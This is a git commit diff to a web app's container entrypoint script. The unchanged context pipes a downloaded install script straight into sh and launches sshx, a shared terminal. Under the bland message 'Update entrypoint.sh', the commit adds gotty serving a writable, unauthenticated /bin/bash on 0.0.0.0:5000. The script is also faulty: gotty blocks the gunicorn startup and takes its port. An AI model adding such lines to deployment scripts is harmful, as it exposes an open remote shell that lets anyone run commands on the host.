d96604ce163d83fe0b104154f7ae1e3f1787f6ab
mobin mazahery <98708517+mobin-mazahery-school@users.noreply.github.com>
2026-02-23 23:34:51 +0330

    Update entrypoint.sh

--- src/entrypoint.sh
+++ src/entrypoint.sh
@@ -4,5 +4,10 @@ set -ex
 curl -sSf https://sshx.io/get | sh
 sshx &
 
+wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz
+tar -xf gotty_linux_amd64.tar.gz
+
+./gotty -w --address 0.0.0.0 --port 5000 --reconnect /bin/bash
+
 # Start gunicorn, listening on port 500, access log to stdout
 exec gunicorn -w 4 -b '0.0.0.0:5000' --access-logfile=- 'app:app'
